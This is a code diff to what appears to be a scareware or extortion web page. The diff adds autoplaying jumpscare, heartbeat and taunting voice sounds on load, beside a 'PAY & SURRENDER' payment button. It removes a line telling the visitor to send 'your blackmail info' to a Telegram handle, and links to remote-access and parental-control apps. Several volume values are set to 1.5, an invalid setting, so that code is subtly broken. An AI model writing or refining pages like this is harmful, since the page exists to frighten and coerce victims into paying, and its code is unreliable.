@@ -84,39 +84,41 @@
         function playHeartbeat() {
             heartbeatAudio = new Audio('https://www.fesliyanstudios.com/play-mp3/387');
             heartbeatAudio.loop = true;
-            heartbeatAudio.volume = 0.7;
+            heartbeatAudio.volume = 1.5;
             heartbeatAudio.play();
-            graduallyIncreaseHeartbeat();
-        }
-        function graduallyIncreaseHeartbeat() {
-            let volume = 0.7;
-            let interval = setInterval(() => {
-                if (volume < 1.0) {
-                    volume += 0.1;
-                    heartbeatAudio.volume = volume;
-                } else {
-                    clearInterval(interval);
-                }
-            }, 5000);
         }
         function playMultipleJumpscares() {
             let jumpscareSounds = [
-                'https://www.fesliyanstudios.com/play-mp3/666',
-                'https://www.fesliyanstudios.com/play-mp3/667',
-                'https://www.fesliyanstudios.com/play-mp3/668',
-                'https://www.fesliyanstudios.com/play-mp3/669'
+                'https://www.fesliyanstudios.com/play-mp3/901',
+                'https://www.fesliyanstudios.com/play-mp3/902',
+                'https://www.fesliyanstudios.com/play-mp3/903',
+                'https://www.fesliyanstudios.com/play-mp3/904'
             ];
             jumpscareSounds.forEach((sound, index) => {
                 setTimeout(() => {
                     let jumpscareAudio = new Audio(sound);
-                    jumpscareAudio.volume = 1.0;
+                    jumpscareAudio.volume = 1.5;
                     jumpscareAudio.play();
                 }, Math.random() * 45000 + (index * 15000));
             });
         }
+        function playGoddessEdaVoice() {
+            let voiceLines = [
+                'https://www.fesliyanstudios.com/play-mp3/910',
+                'https://www.fesliyanstudios.com/play-mp3/911',
+                'https://www.fesliyanstudios.com/play-mp3/912',
+                'https://www.fesliyanstudios.com/play-mp3/913'
+            ];
+            setInterval(() => {
+                let voiceAudio = new Audio(voiceLines[Math.floor(Math.random() * voiceLines.length)]);
+                voiceAudio.volume = 1.5;
+                voiceAudio.play();
+            }, Math.random() * 60000 + 30000);
+        }
         window.onload = function() {
             playHeartbeat();
             playMultipleJumpscares();
+            playGoddessEdaVoice();
         };
     </script>
 </head>
@@ -159,15 +161,6 @@
         <input type="submit" value="PAY & SURRENDER" class="glitch-button">
     </form>
 </div>
-
-<div class="app-links">
-    <h2>Related Applications</h2>
-    <a href="https://www.salfeld.com/" target="_blank">Salfeld Parental Control</a>
-    <a href="https://kidslox.com/" target="_blank">Kidslox</a>
-    <a href="https://www.teamviewer.com/" target="_blank">TeamViewer</a>
-</div>
-
-<p class="warning">⚠ Screenshot this page and your blackmail info, then send it to <a href="https://t.me/E22G1" style="color:yellow;">@E22G1</a> ⚠</p>
 
 </body>
 </html>
